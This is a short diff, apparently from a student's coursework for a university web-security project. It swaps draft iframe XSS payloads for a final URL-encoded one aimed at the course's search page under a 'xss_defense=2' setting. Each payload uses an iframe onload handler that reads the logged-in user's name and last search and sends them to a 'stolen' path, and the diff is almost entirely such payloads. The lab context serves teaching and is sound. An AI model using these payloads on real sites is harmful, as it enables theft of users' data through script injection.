@@ -1,6 +1,1 @@
-#We could use this?
-<IFRAME SRC=# onload="alert(0)"></IFRAME>
-
-<IFRAME SRC=# onload='$(document).ready(location.pathname="stolen?user=" + $("#logged-in-user").text() + "&last_search=" + $("#history-list .history-item:eq(1)").text())'></IFRAME>
-
-<IFRAME SRC=# onload='location.pathname="stolen?xssdefense=2&user=" + $("#logged-in-user").text() + "&last_search=" + $("#history-list .history-item:eq(1)").text()'></IFRAME>
+https://eecs388.org/project2/search?xss_defense=2&q=%3CIFRAME%20SRC%3D%23%20onload%3D%27location.pathname%3D%22stolen%3Fxssdefense%3D2%26user%3D%22%20%2B%20%24(%22%23logged-in-user%22).text()%20%2B%20%22%26last_search%3D%22%20%2B%20%24(%22%23history-list%20.history-item%3Aeq(1)%22).text()%27%3E%3C%2FIFRAME%3E
